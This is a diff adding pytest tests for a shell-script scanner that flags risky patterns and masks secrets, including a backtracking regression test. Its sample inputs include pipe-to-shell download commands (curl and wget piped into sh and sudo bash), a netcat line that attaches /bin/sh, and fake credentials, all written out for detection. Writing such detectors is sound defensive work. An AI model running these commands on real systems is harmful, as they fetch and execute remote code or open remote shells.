@@ -1,9 +1,13 @@
 """One positive and one near-miss sample per static script rule (#14)."""
 
+import time
+
 import pytest  # type: ignore
+import yaml  # pyright: ignore[reportMissingModuleSource]
 
 from tmi_tf.script_scan import (
     CATEGORIES,
+    RULES_PATH,
     SEVERITIES,
     load_rules,
     mask_secrets,
@@ -125,3 +129,80 @@ def test_mask_secrets():
     masked = mask_secrets(text, list(RULES.values()))
     assert "AKIAIOSFODNN7EXAMPLE" not in masked and "[masked-secret]" in masked
     assert "curl x | sh" in masked
+
+
+def test_non_secret_rule_evidence_masks_embedded_secret():
+    text = 'curl -H "Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.e30.abc" https://x/a.sh | sh'
+    (hit,) = [
+        h
+        for h in match_rules(text, list(RULES.values()))
+        if h.rule_id == "curl_pipe_sh"
+    ]
+    assert not hit.secret
+    assert "eyJhbGciOiJIUzI1NiJ9.e30.abc" not in hit.evidence
+    assert "[masked-secret]" in hit.evidence
+
+
+def test_private_key_body_is_masked():
+    text = (
+        "-----BEGIN RSA PRIVATE KEY-----\n"
+        "MIIBOgIBAAJBAKj34GkxFhD90vcNLYLInFEr8cff8oWTz3rq9vY/wF0Sf9Yq5/rN\n"
+        "-----END RSA PRIVATE KEY-----\n"
+    )
+    masked = mask_secrets(text, list(RULES.values()))
+    assert "MIIBOgIBAAJBAKj34GkxFhD90vcNLYLInFEr8cff8oWTz3rq9vY" not in masked
+    assert "[masked-secret]" in masked
+
+
+def test_password_assignment_excludes_pwd_and_path_values():
+    rules = list(RULES.values())
+    positive = match_rules("#!/bin/bash\npassword=Sup3rS3cret!\n", rules)
+    assert "password_assignment" in {h.rule_id for h in positive}
+
+    for near_miss in ("PWD=/opt/app", "pwd: /var/app", "password=/etc/shadow"):
+        hits = match_rules(f"#!/bin/bash\n{near_miss}\n", rules)
+        assert "password_assignment" not in {h.rule_id for h in hits}, near_miss
+
+
+def test_chmod_sticky_tmp_idiom_not_flagged():
+    hits = match_rules("#!/bin/bash\nchmod 1777 /tmp\n", list(RULES.values()))
+    assert "chmod_777" not in {h.rule_id for h in hits}
+
+
+def test_wget_pipe_sudo_bash_flagged():
+    hits = match_rules(
+        "#!/bin/bash\nwget -qO- http://x/i | sudo -E bash -\n", list(RULES.values())
+    )
+    assert "wget_pipe_sh" in {h.rule_id for h in hits}
+
+
+def test_netcat_attached_shell_path_flagged():
+    hits = match_rules("#!/bin/bash\nnc host 1 -e/bin/sh\n", list(RULES.values()))
+    assert "netcat_exec" in {h.rule_id for h in hits}
+
+
+def test_load_rules_rejects_duplicate_ids(tmp_path):
+    raw = yaml.safe_load(RULES_PATH.read_text(encoding="utf-8"))
+    dup = dict(raw["rules"][0])
+    raw["rules"] = [*raw["rules"], dup]
+    dup_path = tmp_path / "dup_rules.yaml"
+    dup_path.write_text(yaml.safe_dump(raw), encoding="utf-8")
+    with pytest.raises(ValueError, match="duplicate"):
+        load_rules(dup_path)
+
+
+def test_match_rules_linear_time_on_adversarial_single_line_input():
+    """DoS regression (#14): superlinear backtracking on long single lines."""
+    rules = list(RULES.values())
+    adversarial = [
+        "crontab " + "curl ;" * 33_000,
+        "python -c " + "socket " * 28_000,
+        "curl " + "a&&" * 66_000 + "chmod +x",
+        "wget " + ">>a" * 66_000 + "authorized_keys",
+        "b" * 200_000,
+    ]
+    start = time.monotonic()
+    for text in adversarial:
+        match_rules(text, rules)
+    elapsed = time.monotonic() - start
+    assert elapsed < 2.0, f"match_rules took {elapsed:.3f}s on adversarial input"
